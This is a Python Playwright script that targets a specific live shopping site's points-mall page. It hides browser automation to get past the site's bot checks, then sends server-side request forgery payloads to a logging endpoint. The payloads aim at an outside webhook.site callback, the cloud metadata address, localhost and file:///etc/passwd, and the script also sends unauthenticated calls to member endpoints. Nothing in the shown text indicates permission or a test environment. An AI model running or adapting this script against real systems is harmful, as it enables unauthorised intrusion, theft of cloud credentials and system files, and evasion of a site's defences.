import os
from playwright.sync_api import sync_playwright
U=os.environ.get('PROBE_URL','https://m.lbtek.com/points-mall')
TOK=os.environ.get('TOK','')
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto(U, wait_until='domcontentloaded', timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async (tok) => {
      const out={};
      const call=async(n,u,m,bd)=>{try{const o={method:m,headers:{'Content-Type':'application/json','lang':'zh-CN'}};if(bd!==null)o.body=JSON.stringify(bd);const r=await fetch(u,o);const t=await r.text();out[n]=r.status+'|'+(t.length>320?t.slice(0,320):t);}catch(e){out[n]='ERR '+String(e).slice(0,100);}};
      await call('nf_webhook','/api/v1/not-found-log','POST',{target_url:'https://webhook.site/'+tok+'?ssrf=1'});
      await call('nf_meta','/api/v1/not-found-log','POST',{target_url:'http://100.100.100.200/latest/meta-data/'});
      await call('nf_local','/api/v1/not-found-log','POST',{target_url:'http://127.0.0.1/'});
      await call('nf_gopher','/api/v1/not-found-log','POST',{target_url:'file:///etc/passwd'});
      await call('mv_post','/api/v1/member-visit','POST',{});
      await call('mv_put','/api/v1/member-visit','PUT',{});
      await call('cr_ad','/api/v1/home/clickRecord','POST',{adsId:1});
      await call('cr_ad2','/api/v1/home/clickRecord','POST',{id:1,type:1});
      return out;
    }""", TOK)
    print('===== SSRF =====',flush=True)
    for k,v in res.items(): print('%-12s %s'%(k,v),flush=True)
    b.close()
